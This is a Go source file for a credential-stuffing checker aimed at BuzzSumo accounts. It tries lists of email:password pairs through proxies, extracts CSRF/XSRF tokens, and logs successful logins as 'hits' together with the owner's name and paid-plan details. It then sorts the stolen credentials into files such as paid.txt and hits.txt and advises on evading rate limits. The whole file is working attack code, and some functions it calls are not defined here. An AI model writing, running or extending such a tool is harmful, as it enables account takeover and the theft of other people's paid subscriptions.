package main

import (
	"compress/gzip"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type CheckStatus string

const (
	StatusHit            CheckStatus = "HIT"
	StatusFail           CheckStatus = "FAIL"
	StatusError          CheckStatus = "ERROR"
	StatusRateLimited    CheckStatus = "RATE_LIMITED"
	StatusVerifyRequired CheckStatus = "VERIFY_REQUIRED"
)

type CheckResult struct {
	Email    string
	Password string
	Status   CheckStatus
	Reason   string

	PlanName         string
	PlanID           string
	StripePlanID     string
	PlanInterval     string
	PlanLabel        string
	FirstName        string
	LastName         string
	SearchesLimit    string
	AlertsLimit      string
	HasProFeatures   string
	AccountEmail     string
}

type Checker struct {
	cfg    *Config
	client *http.Client
}

func NewChecker(cfg *Config) (*Checker, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}
	timeout := time.Duration(cfg.Settings.TimeoutSeconds) * time.Second
	return &Checker{
		cfg: cfg,
		client: &http.Client{
			Timeout: timeout,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 8 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}, nil
}

func (c *Checker) freshClient(proxyURL *url.URL) (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}
	timeout := time.Duration(c.cfg.Settings.TimeoutSeconds) * time.Second
	transport := &http.Transport{}
	if proxyURL != nil {
		transport.Proxy = http.ProxyURL(proxyURL)
	}
	return &http.Client{
		Timeout:   timeout,
		Jar:       jar,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 8 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}, nil
}

func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	vars := map[string]string{
		"email":       email,
		"password":    password,
		"user_agent":  c.cfg.UserAgent,
		"base_url":    c.cfg.BaseURL(),
		"login_url":   c.cfg.LoginURL(),
	}

	// Step 1: GET login page (retry on HTTP 429)
	loginBody, loginStatus, err := c.fetchLoginPage(client)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = "BuzzSumo rate limit (HTTP 429) — use 3 workers or retry rate_limited.txt later"
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}

	inertiaVersion, csrfToken, err := parseLoginPage(loginBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	xsrfToken, err := xsrfFromJar(client, c.cfg.LoginURL())
	if err != nil || xsrfToken == "" {
		result.Status = StatusError
		result.Reason = "missing XSRF-TOKEN cookie"
		return result
	}
	_ = csrfToken

	vars["inertia_version"] = inertiaVersion
	vars["xsrf_token"] = xsrfToken

	// Step 2: POST login
	postBody := fmt.Sprintf(`{"email":%s,"password":%s}`, jsonString(email), jsonString(password))
	postRespBody, postStatus, postHeaders, err := c.doRequest(client, "POST", c.cfg.LoginURL(), map[string]string{
		"Accept":            "text/html, application/xhtml+xml",
		"Accept-Language":   "en-US,en;q=0.9",
		"Content-Type":      "application/json",
		"Origin":            c.cfg.BaseURL(),
		"Referer":           c.cfg.LoginURL(),
		"X-Inertia":         "true",
		"X-Inertia-Version": inertiaVersion,
		"X-Requested-With":  "XMLHttpRequest",
		"X-XSRF-TOKEN":      xsrfToken,
		"User-Agent":        c.cfg.UserAgent,
	}, postBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	postText := strings.ToLower(postRespBody)
	failPhrases := []string{
		"invalid email or password",
		"invalid email",
		"these credentials do not match",
		"too many attempts",
		"account locked",
	}
	for _, phrase := range failPhrases {
		if strings.Contains(postText, phrase) {
			result.Status = StatusFail
			result.Reason = phrase
			return result
		}
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = "login POST rate limited (HTTP 429)"
		return result
	}
	if postStatus == http.StatusUnauthorized || postStatus == http.StatusUnprocessableEntity || postStatus == 419 {
		result.Status = StatusFail
		result.Reason = fmt.Sprintf("login HTTP %d", postStatus)
		return result
	}

	if c.loginNeedsFacebookVerify(client, postRespBody, postHeaders) {
		c.enrichPlanFromAccount(client, &result)
		result.Status = StatusVerifyRequired
		result.Reason = "Facebook verification required"
		return result
	}

	// Step 3: GET account query (plan info)
	accountBody, accountStatus, _, err := c.doRequest(client, "GET", c.cfg.AccountQueryURL(), map[string]string{
		"Accept":            "application/json, text/plain, */*",
		"Accept-Language":   "en-US,en;q=0.9",
		"Cache-Control":     "no-cache",
		"Referer":           c.cfg.BaseURL() + "/",
		"X-Requested-With":  "XMLHttpRequest",
		"User-Agent":        c.cfg.UserAgent,
	}, "")
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	if accountStatus == http.StatusUnauthorized || accountStatus == http.StatusForbidden {
		result.Status = StatusFail
		result.Reason = "not authenticated"
		return result
	}
	if accountStatus != http.StatusOK {
		result.Status = StatusFail
		result.Reason = fmt.Sprintf("account query HTTP %d", accountStatus)
		return result
	}

	result.AccountEmail, _ = jsonPathString(accountBody, "0.email")
	result.FirstName, _ = jsonPathString(accountBody, "0.first_name")
	result.LastName, _ = jsonPathString(accountBody, "0.last_name")
	result.PlanName, _ = jsonPathString(accountBody, "0.account.plan.name")
	result.PlanID, _ = jsonPathString(accountBody, "0.account.plan_id")
	result.StripePlanID, _ = jsonPathString(accountBody, "0.account.plan.stripe_plan_id")
	result.PlanInterval, _ = jsonPathString(accountBody, "0.account.stripe_subscription_interval")
	result.SearchesLimit, _ = jsonPathString(accountBody, "0.account.plan.pricing_limits.plan_limit.searches")
	result.AlertsLimit, _ = jsonPathString(accountBody, "0.account.plan.pricing_limits.plan_limit.alerts")
	result.HasProFeatures, _ = jsonPathString(accountBody, "0.account.plan.has_pro_features")

	if result.PlanName == "" {
		// Optional backup: segment traits
		segBody, segStatus, _, segErr := c.doRequest(client, "GET", c.cfg.SegmentTraitsURL(), map[string]string{
			"Accept":           "application/json, text/plain, */*",
			"Cache-Control":    "no-cache",
			"Referer":          c.cfg.BaseURL() + "/",
			"X-Requested-With": "XMLHttpRequest",
			"User-Agent":       c.cfg.UserAgent,
		}, "")
		if segErr == nil && segStatus == http.StatusOK {
			if name, ok := jsonPathString(segBody, "userTraits.plan_name"); ok && name != "" {
				result.PlanName = name
			}
			if pid, ok := jsonPathString(segBody, "userTraits.plan_id"); ok && result.PlanID == "" {
				result.PlanID = pid
			}
		}
	}

	if result.PlanName == "" || result.AccountEmail == "" {
		result.Status = StatusFail
		result.Reason = "login ok but no account/plan data"
		return result
	}

	if c.sessionRequiresFacebookVerify(client) {
		result.PlanLabel = classifyPlan(c.cfg, result)
		result.Status = StatusVerifyRequired
		result.Reason = "Facebook verification required"
		return result
	}

	result.PlanLabel = classifyPlan(c.cfg, result)
	if ok, reason := c.accountIsUsablePaid(client, accountBody, result.PlanLabel); !ok {
		result.Status = StatusPlanInactive
		result.Reason = reason
		return result
	}

	result.Status = StatusHit
	return result
}

func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers map[string]string, body string) (string, int, http.Header, error) {
	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, rawURL, bodyReader)
	if err != nil {
		return "", 0, nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, nil, err
	}
	defer resp.Body.Close()

	var reader io.Reader = resp.Body
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gz, err := gzip.NewReader(resp.Body)
		if err != nil {
			return "", resp.StatusCode, resp.Header, err
		}
		defer gz.Close()
		reader = gz
	}

	data, err := io.ReadAll(io.LimitReader(reader, 2<<20))
	if err != nil {
		return "", resp.StatusCode, resp.Header, err
	}
	return string(data), resp.StatusCode, resp.Header, nil
}

func (c *Checker) fetchLoginPage(client *http.Client) (string, int, error) {
	retries := c.cfg.Settings.RetryOnError
	if retries < 0 {
		retries = 0
	}
	var body string
	var status int
	var err error
	for attempt := 0; attempt <= retries; attempt++ {
		body, status, _, err = c.doRequest(client, "GET", c.cfg.LoginURL(), map[string]string{
			"Accept":          "text/html, application/xhtml+xml",
			"Accept-Language": "en-US,en;q=0.9",
			"User-Agent":      c.cfg.UserAgent,
		}, "")
		if err != nil {
			return "", 0, err
		}
		if status == http.StatusOK {
			return body, status, nil
		}
		if status == http.StatusTooManyRequests && attempt < retries {
			time.Sleep(time.Duration(2*(attempt+1)) * time.Second)
			continue
		}
		return body, status, nil
	}
	return body, status, nil
}

var dataPageRE = regexp.MustCompile(`data-page="([^"]+)"`)

func parseLoginPage(body string) (version, csrfToken string, err error) {
	trimmed := strings.TrimSpace(body)
	if strings.HasPrefix(trimmed, "{") {
		version, _ = jsonPathString(body, "version")
		csrfToken, _ = jsonPathString(body, "props.csrf_token")
		if version == "" {
			return "", "", fmt.Errorf("missing Inertia version in JSON login page")
		}
		return version, csrfToken, nil
	}

	match := dataPageRE.FindStringSubmatch(body)
	if len(match) < 2 {
		return "", "", fmt.Errorf("missing Inertia data-page on login HTML")
	}
	decoded := html.UnescapeString(match[1])
	version, _ = jsonPathString(decoded, "version")
	csrfToken, _ = jsonPathString(decoded, "props.csrf_token")
	if version == "" {
		return "", "", fmt.Errorf("missing Inertia version in data-page")
	}
	return version, csrfToken, nil
}

func xsrfFromJar(client *http.Client, pageURL string) (string, error) {
	u, err := url.Parse(pageURL)
	if err != nil {
		return "", err
	}
	for _, cookie := range client.Jar.Cookies(u) {
		if cookie.Name == "XSRF-TOKEN" {
			decoded, err := url.QueryUnescape(cookie.Value)
			if err != nil {
				return cookie.Value, nil
			}
			return decoded, nil
		}
	}
	return "", fmt.Errorf("XSRF-TOKEN not found")
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func jsonPathString(body, path string) (string, bool) {
	var data any
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return "", false
	}
	val, ok := walkJSONPath(data, path)
	if !ok || val == nil {
		return "", false
	}
	switch v := val.(type) {
	case string:
		return v, true
	case float64:
		if v == float64(int64(v)) {
			return strconv.FormatInt(int64(v), 10), true
		}
		return strconv.FormatFloat(v, 'f', -1, 64), true
	case bool:
		if v {
			return "true", true
		}
		return "false", true
	default:
		b, err := json.Marshal(v)
		if err != nil {
			return "", false
		}
		return string(b), true
	}
}

func walkJSONPath(data any, path string) (any, bool) {
	cur := data
	if path == "" {
		return cur, true
	}
	for _, part := range strings.Split(path, ".") {
		if idx, err := strconv.Atoi(part); err == nil {
			arr, ok := cur.([]any)
			if !ok || idx < 0 || idx >= len(arr) {
				return nil, false
			}
			cur = arr[idx]
			continue
		}
		obj, ok := cur.(map[string]any)
		if !ok {
			return nil, false
		}
		val, ok := obj[part]
		if !ok {
			return nil, false
		}
		cur = val
	}
	return cur, true
}

func classifyPlan(cfg *Config, r CheckResult) string {
	stripe := strings.ToLower(r.StripePlanID)
	name := strings.ToLower(r.PlanName)

	if stripe == "free_trial" || strings.Contains(name, "free trial") {
		return "FREE_TRIAL"
	}
	if strings.Contains(name, "enterprise") {
		return "ENTERPRISE"
	}
	if strings.Contains(name, "agency") {
		return "AGENCY"
	}
	if strings.Contains(name, "pro+") || strings.Contains(name, "pro plus") {
		return "PRO_PLUS"
	}
	if strings.Contains(name, "pro") {
		return "PRO"
	}
	if strings.Contains(name, "free") {
		return "FREE"
	}
	if stripe != "" && stripe != "free_trial" {
		return "PAID"
	}
	return "UNKNOWN"
}

func (r CheckResult) HitLine(cfg *Config) string {
	replacer := strings.NewReplacer(
		"{{email}}", r.Email,
		"{{password}}", r.Password,
		"{{plan_name}}", r.PlanName,
		"{{plan_id}}", r.PlanID,
		"{{stripe_plan_id}}", r.StripePlanID,
		"{{plan_interval}}", r.PlanInterval,
		"{{plan_label}}", r.PlanLabel,
		"{{first_name}}", r.FirstName,
		"{{last_name}}", r.LastName,
		"{{searches_limit}}", r.SearchesLimit,
		"{{alerts_limit}}", r.AlertsLimit,
	)
	if cfg.Output.HitLine != "" {
		return replacer.Replace(cfg.Output.HitLine)
	}
	return fmt.Sprintf("%s:%s | Plan=%s | PlanID=%s | Stripe=%s | Interval=%s | Label=%s",
		r.Email, r.Password, r.PlanName, r.PlanID, r.StripePlanID, r.PlanInterval, r.PlanLabel)
}

func (r CheckResult) ConsoleLine(cfg *Config, hit bool) string {
	if hit {
		tmpl := cfg.Output.ConsoleHit
		if tmpl == "" {
			return fmt.Sprintf("[HIT] %s | Active Plan: %s (%s) | stripe=%s | searches=%s alerts=%s",
				r.Email, r.PlanName, r.PlanLabel, r.StripePlanID, r.SearchesLimit, r.AlertsLimit)
		}
		return strings.NewReplacer(
			"{{email}}", r.Email,
			"{{plan_name}}", r.PlanName,
			"{{plan_label}}", r.PlanLabel,
			"{{stripe_plan_id}}", r.StripePlanID,
			"{{searches_limit}}", r.SearchesLimit,
			"{{alerts_limit}}", r.AlertsLimit,
		).Replace(tmpl)
	}
	tmpl := cfg.Output.ConsoleFail
	if tmpl == "" {
		return fmt.Sprintf("[FAIL] %s | %s", r.Email, r.Reason)
	}
	return strings.NewReplacer(
		"{{email}}", r.Email,
		"{{reason}}", r.Reason,
	).Replace(tmpl)
}

func appendLine(path string, line string) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(line + "\n")
	return err
}

func ensureDir(path string) error {
	return os.MkdirAll(path, 0o755)
}

func writeResultFiles(cfg *Config, r CheckResult, resultsDir string) error {
	if err := ensureDir(resultsDir); err != nil {
		return err
	}
	line := r.HitLine(cfg)
	switch r.Status {
	case StatusHit:
		if err := appendLine(filepath.Join(resultsDir, "hits.txt"), line); err != nil {
			return err
		}
		byPlanDir := filepath.Join(resultsDir, "by_plan")
		if err := ensureDir(byPlanDir); err != nil {
			return err
		}
		if err := appendLine(filepath.Join(byPlanDir, r.PlanLabel+".txt"), line); err != nil {
			return err
		}
		switch r.PlanLabel {
		case "FREE_TRIAL", "FREE":
			if err := appendLine(filepath.Join(resultsDir, "free_trial.txt"), line); err != nil {
				return err
			}
		default:
			if err := appendLine(filepath.Join(resultsDir, "paid.txt"), line); err != nil {
				return err
			}
		}
	case StatusFail:
		failLine := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
		return appendLine(filepath.Join(resultsDir, "invalid.txt"), failLine)
	case StatusRateLimited:
		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
		return appendLine(filepath.Join(resultsDir, "rate_limited.txt"), line)
	case StatusError:
		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
		return appendLine(filepath.Join(resultsDir, "errors.txt"), line)
	case StatusVerifyRequired:
		line := fmt.Sprintf("%s:%s | Facebook verification required", r.Email, r.Password)
		if r.PlanName != "" {
			line += fmt.Sprintf(" | Plan=%s | PlanID=%s | Stripe=%s | Label=%s",
				r.PlanName, r.PlanID, r.StripePlanID, r.PlanLabel)
		}
		return appendLine(filepath.Join(resultsDir, "facebook_verify.txt"), line)
	case StatusPlanInactive:
		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
		if r.PlanName != "" {
			line += fmt.Sprintf(" | Plan=%s | PlanID=%s | Stripe=%s | Label=%s",
				r.PlanName, r.PlanID, r.StripePlanID, r.PlanLabel)
		}
		return appendLine(filepath.Join(resultsDir, "inactive_plan.txt"), line)
	}
	return nil
}
